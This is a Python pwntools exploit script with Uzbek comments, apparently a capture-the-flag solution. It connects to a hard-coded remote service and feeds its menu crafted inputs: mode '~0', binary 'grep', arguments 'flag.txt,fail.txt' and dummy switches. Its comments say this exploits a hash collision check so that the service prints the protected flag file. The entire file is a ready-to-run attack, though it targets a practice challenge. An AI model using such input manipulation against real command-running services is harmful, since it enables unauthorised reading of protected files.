#!/usr/bin/env python3
from pwn import *
import sys

# =========================================================
# SOZLAMALAR (O'zingizning IP va Portingizni shu yerga yozing)
# =========================================================
HOST = "154.57.164.66"  # Masalan: "192.168.1.10"
PORT = 30303                            # Masalan: 1337

def solve():
    # Serverga ulanish
    print(f"\n[+] {HOST}:{PORT} manziliga ulanilmoqda...")
    try:
        p = remote(HOST, PORT)
    except Exception as e:
        print(f"[-] Ulanishda xatolik yuz berdi: {e}")
        sys.exit(1)

    # 1-qadam: Mode = ~0 (Bitwise NOT, Python'da -1 ga teng aylanadi)
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"(mode)> ")
    p.sendline(b"~0")
    print("[+] Mode muvaffaqiyatli sozlandi: ~0")

    # 2-qadam: Bin = grep (1 va 2 xato kodlarini hosil qilish uchun)
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"(bin)> ")
    p.sendline(b"grep")
    print("[+] Bin muvaffaqiyatli sozlandi: grep")

    # 3-qadam: Argumentlar (flag.txt bor fayl, fail.txt yo'q fayl)
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"(arg1,arg2)> ")
    p.sendline(b"flag.txt,fail.txt")
    print("[+] Argumentlar sozlandi: flag.txt, fail.txt")

    # 4-qadam: Switchlar (grep topa olmaydigan ixtiyoriy matn)
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"(switch1,switch2)> ")
    p.sendline(b"dummy,dummy")
    print("[+] Switchlar sozlandi: dummy, dummy")

    # 5-qadam: Exploitni yuborish (hash collision ni tekshirish)
    p.recvuntil(b"> ")
    p.sendline(b"5")
    print("[+] Exploit ishga tushdi, serverdan flag kutilmoqda...\n")

    # Natijani o'qish va ekranga chiroyli qilib chiqarish
    try:
        natija = p.recvall(timeout=5).decode('utf-8', errors='ignore')
        print("=" * 60)
        print(natija.strip())
        print("=" * 60)
    except Exception as e:
        print(f"[-] Natijani o'qishda xatolik: {e}")

if __name__ == "__main__":
    # Avtomatik ravishda terminaldagi xabarlarni kamaytirish (pwntools loglari)
    context.log_level = 'error'

    # Agar terminaldan IP va Port berilsa, o'shani qabul qiladi
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    
    # IP va Port kiritilmagan bo'lsa, foydalanuvchini ogohlantirish
    if HOST == "IP_MANZILNI_SHU_YERGA_YOZING":
        print("[-] XATOLIK: IP manzil kiritilmagan!")
        print("[!] 1-usul: Kod ichidagi HOST va PORT o'zgaruvchilarini tahrirlang.")
        print("[!] 2-usul: Terminaldan to'g'ridan-to'g'ri ishlating: python3 solve.py <IP> <PORT>")
        sys.exit(1)

    solve()
